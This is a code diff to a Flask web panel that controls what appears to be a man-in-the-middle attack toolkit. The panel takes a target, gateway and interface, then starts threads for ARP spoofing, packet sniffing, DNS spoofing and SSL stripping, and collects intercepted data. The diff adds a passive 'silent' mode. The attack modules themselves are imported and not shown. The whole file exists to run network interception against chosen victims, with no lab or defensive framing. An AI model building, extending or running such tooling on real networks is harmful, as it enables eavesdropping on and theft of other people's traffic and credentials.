@@ -1,6 +1,5 @@
 from flask import Flask, render_template, jsonify, request, Response
 import threading
-import scapy.all as scapy
 from core import STATUS, STOP_EVENT, CAPTURE_DIR
 from core.arp import run_attack_loop
 from core.ssl_strip import run_ssl_strip
@@ -10,13 +9,10 @@ from core.scanner import scan_network
 
 def create_app():
     app = Flask(__name__)
-    
-    # 1. ADD 'dns' TO THREAD TRACKER
     threads = {'attack': None, 'sniffer': None, 'ssl': None, 'dns': None}
 
     @app.route('/')
-    def index():
-        return render_template('index.html', data=STATUS)
+    def index(): return render_template('index.html', data=STATUS)
 
     @app.route('/action', methods=['POST'])
     def action():
@@ -24,13 +20,11 @@ def create_app():
         act = req.get('action')
 
         if act == 'clear_logs':
-            STATUS["logs"] = [] # Empty the backend log list
+            STATUS["logs"] = [] 
             return jsonify({"status": "cleared"})
-        
         if act == 'clear_data':
-            STATUS["intercepted_data"] = [] # Empty the backend data list
+            STATUS["intercepted_data"] = []
             return jsonify({"status": "cleared"})
-            
         if act == 'stop':
             STOP_EVENT.set()
             return jsonify({"status": "stopped"})
@@ -40,27 +34,23 @@ def create_app():
             STATUS["target"] = req.get('target')
             STATUS["gateway"] = req.get('gateway')
             STATUS["interface"] = req.get('interface')
-            
-            # 2. CRITICAL FIX: SAVE DNS SETTINGS FROM FRONTEND
             STATUS["dns_domain"] = req.get('dns_domain')
             STATUS["dns_ip"] = req.get('dns_ip')
             
-            # Start Sniffer
+            # Start Sniffer (Common to all)
             if not threads['sniffer'] or not threads['sniffer'].is_alive():
                 threads['sniffer'] = threading.Thread(target=start_sniffer, daemon=True)
                 threads['sniffer'].start()
 
-            # Start ARP (Always runs for both attacks)
-            STATUS["mode"] = "ARP SNIFF" # Default
-            threads['attack'] = threading.Thread(
-                target=run_attack_loop, 
-                args=(STATUS["target"], STATUS["gateway"]), 
-                daemon=True
-            )
-            threads['attack'].start()
+            # --- MODE SELECTION ---
+            passive_mode = False
 
-            # 3. CRITICAL FIX: START THE DNS THREAD
-            if act == 'start_dns':
+            if act == 'start_silent':
+                STATUS["mode"] = "SILENT"
+                passive_mode = True 
+                # Silent Mode: We START ARP loop (passive=True) but NO other attacks.
+
+            elif act == 'start_dns':
                 STATUS["mode"] = "DNS SPOOF"
                 threads['dns'] = threading.Thread(target=start_dns_spoofing, daemon=True)
                 threads['dns'].start()
@@ -69,6 +59,14 @@ def create_app():
                 STATUS["mode"] = "SSL STRIP"
                 threads['ssl'] = threading.Thread(target=run_ssl_strip, daemon=True)
                 threads['ssl'].start()
+
+            # Start ARP Loop (Active or Passive based on flag)
+            threads['attack'] = threading.Thread(
+                target=run_attack_loop, 
+                args=(STATUS["target"], STATUS["gateway"], passive_mode), 
+                daemon=True
+            )
+            threads['attack'].start()
             
             return jsonify({"status": "started"})
             
